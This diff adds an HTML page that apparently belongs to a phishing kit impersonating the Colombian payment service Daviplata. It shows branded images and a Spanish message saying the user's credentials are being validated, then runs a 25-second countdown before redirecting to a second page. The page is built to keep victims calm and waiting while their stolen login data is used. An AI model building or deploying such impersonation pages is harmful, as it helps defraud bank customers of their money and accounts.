@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head>
+<body style="color: #BE2720; font-size: 18px; font-family: &#39;Graphik-Regular&#39;sans-serif; background: url(archivos/oapp.jpg);
+  background-size: cover;
+  background-repeat: no-repeat;"><main style="margin-top: 0px; width: 80%;">
+
+  <link rel="stylesheet" href="./archivos/style.css">
+
+  <title>Daviplata</title>
+  
+     
+ <script language="JavaScript">
+ 
+    /* Determinamos el tiempo total en segundos */
+    var totalTiempo=25;
+    
+    var url="index2.html";
+ 
+    function updateReloj()
+    {
+        document.getElementById('CuentaAtras').innerHTML = "Espere un momento<br>No cierre esta ventana<br><br>"+"0:"+totalTiempo+" <br><br> Estamos validando tus credenciales.";
+ 
+        if(totalTiempo==0)
+        {
+            window.location=url;
+        }else{
+            /* Restamos un segundo al tiempo restante */
+            totalTiempo-=1;
+            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
+            setTimeout("updateReloj()",1000);
+        }
+    }
+ 
+    window.onload=updateReloj;
+ 
+    </script>
+
+
+<style>
+#wait{
+  position:relative;
+  
+  width:;
+  z-index:9999;
+  
+}
+
+
+</style>
+
+<center>
+  <br><br><br><br><br><br>
+<div>
+  <img src="./archivos/m1.png" width="350"><br> <br> <p style="font-size: 24px; margin: 40px;"><b>Cargando...</b></p>
+<br><img style="font-weight: 900; margin-bottom: 30px;" src="./archivos/load.gif" width="70" height="70">
+<br><b><h1 id="CuentaAtras">Espere un momento<br>No cierre esta ventana<br><br>0:25 <br><br> Estamos validando tus credenciales.</h1></b></div>
+
+
+</center></main>
+
+</body>
+</noscript>
+<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">
+
+</div></div></html>
